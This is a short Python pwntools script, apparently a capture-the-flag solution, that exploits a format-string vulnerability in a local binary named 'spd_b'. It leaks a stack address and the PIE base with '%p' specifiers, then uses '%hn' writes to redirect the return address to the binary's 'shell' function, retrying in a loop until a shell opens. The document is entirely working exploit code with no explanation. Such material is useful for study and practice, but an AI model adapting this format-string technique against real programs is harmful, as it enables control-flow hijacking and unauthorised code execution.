from pwn import *

e = context.binary = ELF("./spd_b")
while True:
    try:
        r = e.process()
        payload = b'%c%p%p'
        r.sendline(payload)
        r.recvuntil(b'0x')
        stack = int(r.recv(8).decode(), 16)
        log.info(hex(stack))
        r.recvuntil(b'0x')
        e.address = int(r.recv(8).decode(), 16) - e.sym['guess'] - 15
        log.info(f"PIE: {hex(e.address)}")
        log.info(hex(e.sym['shell']))
        target = e.sym['shell'] & 0xffff
        ret_addr = stack + 0x14
        log.info(hex(ret_addr))
        key1 = ret_addr & 0xffff
        if target < 10000:
            try:
                payload = f'%{key1}c%2$hn'
                r.sendline(payload)
                payload = f'%{target}c%34$hn'
                r.sendline(payload)
                r.interactive()
            except EOFError:
                r.close()
                continue
    except EOFError:
        r.close()
        continue
